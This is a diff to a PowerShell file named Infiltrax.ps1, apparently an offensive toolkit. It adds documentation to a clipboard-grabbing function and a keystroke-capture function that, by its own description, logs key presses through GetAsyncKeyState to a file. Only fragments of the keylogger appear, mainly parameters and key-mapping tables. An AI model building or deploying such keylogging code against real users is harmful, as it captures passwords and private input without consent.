@@ -1,5 +1,19 @@
-﻿function Invoke-Clipboard {
+<#
 
+Infiltrax File: Infiltrax.ps1
+Author: Alex Dhital
+License: MIT License
+Required Dependencies: None
+
+#>
+ function Invoke-Clipboard {
+
+<#
+.SYNOPSIS
+
+Simply gets the raw clipboard contents via Get-Clipboard powershell cmdlet
+
+#>
     try {
         Get-Clipboard -Raw
     }
@@ -11,6 +25,12 @@
 }
 
 function Invoke-KeyStrokeCapture {
+<#
+
+.DESCRIPTION
+Uses GetAsyncKeyState function from user32.dll to map key presses including special characters and appends them to specified file.
+
+#>
 
     param(
         [Parameter(Mandatory = $true)][int]$DurationInSeconds,
@@ -36,16 +56,16 @@ function Invoke-KeyStrokeCapture {
     }
 
     $shiftKeyMapping = @{
-        48 = ")" # Shift + 0
-        49 = "!" # Shift + 1
-        50 = "@" # Shift + 2
-        51 = "#" # Shift + 3
-        52 = "$" # Shift + 4
-        53 = "%" # Shift + 5
-        54 = "^" # Shift + 6
-        55 = "&" # Shift + 7
-        56 = "*" # Shift + 8
-        57 = "(" # Shift + 9
+        48 = ")" # for Shift + 0
+        49 = "!" # for Shift + 1
+        50 = "@" # for Shift + 2
+        51 = "#" # for Shift + 3
+        52 = "$" # for Shift + 4
+        53 = "%" # for Shift + 5
+        54 = "^" # for Shift + 6
+        55 = "&" # for Shift + 7
+        56 = "*" # for Shift + 8
+        57 = "(" # for Shift + 9
     }
 
     $nonPrintableKeys = @{
